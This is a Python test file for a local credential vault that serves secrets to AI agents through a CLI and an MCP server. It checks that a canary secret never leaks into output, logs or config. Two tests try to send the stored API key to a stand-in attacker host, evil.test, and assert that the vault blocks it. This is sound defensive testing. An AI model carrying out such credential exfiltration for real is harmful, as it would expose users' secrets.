import asyncio
import json
import subprocess
import sys
import time

import pytest
from click.testing import CliRunner
from mcp import ClientSession, StdioServerParameters
from mcp.client.stdio import stdio_client
from test_engine import CANARY

from local_agent_vault.broker import request
from local_agent_vault.cli import main
from local_agent_vault.security import SafeError


@pytest.fixture
def running_broker(vault):
    process = subprocess.Popen(
        [
            sys.executable,
            "-m",
            "local_agent_vault.cli",
            "--home",
            str(vault.home),
            "serve",
        ],
        stdin=subprocess.DEVNULL,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
    )
    try:
        deadline = time.monotonic() + 20
        while True:
            if process.poll() is not None:
                pytest.fail("broker stopped before startup")
            try:
                request(vault.home, {"op": "status"})
                break
            except SafeError:
                if time.monotonic() > deadline:
                    pytest.fail("broker startup timed out")
                time.sleep(0.05)
        yield vault.home
    finally:
        if process.poll() is None:
            process.terminate()
        stdout, stderr = process.communicate(timeout=15)
        assert CANARY.encode() not in stdout + stderr


def test_real_cli_and_socket_roundtrip(running_broker):
    runner = CliRunner()
    prefix = ["--home", str(running_broker)]
    result = runner.invoke(
        main,
        prefix
        + [
            "set",
            "API_KEY",
            "--origin",
            "https://api.example.com",
            "--stdin",
        ],
        input=CANARY,
    )
    assert result.exit_code == 0
    assert CANARY not in result.output
    listed = runner.invoke(main, prefix + ["list"])
    assert json.loads(listed.output) == {"names": ["API_KEY"]}
    assert CANARY not in listed.output
    doctor = runner.invoke(main, prefix + ["doctor"])
    assert doctor.exit_code == 0
    assert json.loads(doctor.output)["private_permissions"] is True
    blocked = runner.invoke(
        main,
        prefix
        + [
            "call",
            "https://evil.test/data",
            "--secret",
            "API_KEY",
        ],
    )
    assert blocked.exit_code != 0
    assert "destination_not_allowed" in blocked.output
    assert CANARY not in blocked.output
    with pytest.raises(SafeError, match="operation_not_allowed"):
        request(running_broker, {"op": "set", "value": CANARY})
    deleted = runner.invoke(main, prefix + ["delete", "API_KEY"])
    assert deleted.exit_code == 0
    assert json.loads(runner.invoke(main, prefix + ["list"]).output) == {"names": []}


def test_real_mcp_session_exposes_only_safe_tools(running_broker, tmp_path):
    request(
        running_broker,
        {
            "op": "set",
            "name": "API_KEY",
            "value": CANARY,
            "origins": ["https://api.example.com"],
            "methods": ["GET"],
        },
        management=True,
    )

    async def exercise():
        parameters = StdioServerParameters(
            command=sys.executable,
            args=["-m", "local_agent_vault.cli", "--home", str(running_broker), "mcp"],
        )
        with (tmp_path / "mcp.stderr").open("w+") as stderr:
            async with stdio_client(parameters, errlog=stderr) as (read, write):
                async with ClientSession(read, write) as session:
                    await session.initialize()
                    tools = await session.list_tools()
                    assert {tool.name for tool in tools.tools} == {
                        "api_call",
                        "list_credentials",
                        "vault_status",
                    }
                    names = await session.call_tool("list_credentials")
                    assert CANARY not in names.model_dump_json()
                    assert "API_KEY" in names.model_dump_json()
                    result = await session.call_tool(
                        "api_call",
                        {
                            "url": "https://evil.test/data",
                            "secret": "API_KEY",
                        },
                    )
                    assert CANARY not in result.model_dump_json()
                    assert "destination_not_allowed" in result.model_dump_json()
            stderr.seek(0)
            assert CANARY not in stderr.read()

    asyncio.run(exercise())


def test_mcp_config_contains_no_values(running_broker):
    runner = CliRunner()
    for client, root in [("copilot", "servers"), ("claude", "mcpServers")]:
        result = runner.invoke(
            main,
            [
                "--home",
                str(running_broker),
                "mcp-config",
                "--client",
                client,
            ],
        )
        assert result.exit_code == 0
        definition = json.loads(result.output)[root]["local-vault"]
        assert definition["args"][-1] == "mcp"
        assert "env" not in definition
        assert CANARY not in result.output
